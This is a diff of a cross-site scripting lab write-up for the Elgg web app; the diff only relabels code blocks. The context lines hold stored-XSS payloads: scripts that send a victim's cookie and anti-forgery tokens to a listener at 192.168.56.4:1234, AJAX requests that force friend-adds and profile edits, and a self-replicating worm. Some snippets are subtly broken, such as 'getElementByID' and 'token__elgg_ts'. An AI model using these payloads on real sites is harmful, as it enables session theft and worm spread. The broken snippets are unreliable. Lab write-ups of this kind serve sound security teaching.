@@ -11,7 +11,7 @@ The tasks are based on a web application called ELGG which is open source. It is
 
 The web app is hosted on seedubuntu vm and ubuntu vm is used to create a new account user11. To make the web app visible as a site named `www.xsslabelgg.com`, add a name and IP address parameter on the ubuntu vm’s hosts file. Log into the account `user11`. Go to about me section. This section allows adding ‘about me’ information to our profiles. By default the editor provided is a rich text editor which adds extra text to whatever is inside. This is counterproductive to the attack therefore this editor is removed and the plain text editor is used. The section is used to add javascript code inside it -
 
-```javascript
+```html
 <script>alert('XSS');</script>
 ```
 
@@ -21,7 +21,7 @@ On saving this an alert is displayed on the page. The web app sees the text insi
 
 This is along the same lines as the previous task and does similar thing except the new code that is put inside the about me section now displays the cookie. The new code is -
 
-```javascript
+```html
 <script>alert(document.cookie);</script>
 ```
 
@@ -31,7 +31,7 @@ This displays the cookie of `user11` when saved. On reloading too it does the 
 
 This attack focuses on providing code in the ‘about me’ section such that the attacker can obtain the cookie without having to be preset when the account of `user11` is visited. For this the attacker injects a code that basically is a GET request for an image and also adds the cookie of the victim in the url itself.
 
-```javascript
+```html
 <script>document.write('<img src=http://192.168.56.4:1234?c='+escape(document.cookie)+'  >');</script>
 ```
 
@@ -64,7 +64,7 @@ http://www.xsslabelgg.com/action/friends/add?friend=43&__elgg_ts=152022381&__elg
 
 Also, the cookie is sent as a part of the request header. Therefore, the 3 important things noted are - 1. the `friend=43` part which specifies the umber associated with the `user11` account. 2. the cookie sent as a part of request header. 3. the two parts `__elgg_ts` and `__elgg_token` which are tokens used as a countermeasure against the cross site request forgery attack. The above have to be found and can also be found on the view-source page of the website. The two tokens are stored in variables as mentioned above and since they are different for every web user, even if the attacker does not know the tokens of user `alice`, the name of the two token variables can be used to call the values. The response part for the request under inspect element can help locate these variables being used as - `elgg.security.token.__elgg_ts` and `elgg.security.token.__elgg_token`. Using these variables, the attack code can be formed. Use of cookie retrieval technique to retrieve the two tokens as well.
 
-```javascript
+```html
 <script>document.write('<img src=http://192.168.56.4:1234?c='+elgg.security.token.__elgg_ts+'&'+elgg.security.token.__elgg_token+'  >');</script>
 ```
 
@@ -85,7 +85,7 @@ To actually make other accounts execute the malicious code that can trigger them
 
 For this we can use the following code in javascript using AJAX and then store it into the ‘about me’ section of `user11`. The code is as follows -
 
-```javascript
+```html
 <script type="text/javascript">
 var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 var token="&__elgg_token="+elgg.security.token.__elgg_token;
@@ -110,7 +110,7 @@ This task is about coding a worm which can change the information of an account 
 
 The objective is to write a javascript code in the ‘about me’ section of `user11` such that when someone visits the profile of `user11`, the status as required by `user11` which is also set on his own account will be set on the account of the one who visits `user11`‘s page. The javascript code must contain the post request required to proceed with the changing of the text in the ’about me’ section. The code is as follows -
 
-```javascript
+```html
 <script type="text/javascript">
 var sendurl="http://www.xsslabelgg.com/action/profile/edit";
 var ts=elgg.security.token__elgg_ts;
@@ -137,7 +137,7 @@ The parts of adding the attacker as a friend as well as posting on the victim’
 
 The process of self propagating sees the following approach - The code will have to be replicated by the code itself. This can be done by using the POST method as described in Task 5. The method to do the following is -
 
-```javascript
+```html
 <script id="daut" type="text/javascript">
 var replicate="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML)
 .concat("</").concat("script>");
@@ -151,7 +151,7 @@ This approach can be merged with the POST exploit to copy the required update an
 
 The code clubbed with the POST exploit is as follows -
 
-```javascript
+```html
 <script id="daut" type="text/javascript">
 var sp="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");
 var sendurl="http://www.xsslabelgg.com/action/profile/edit";
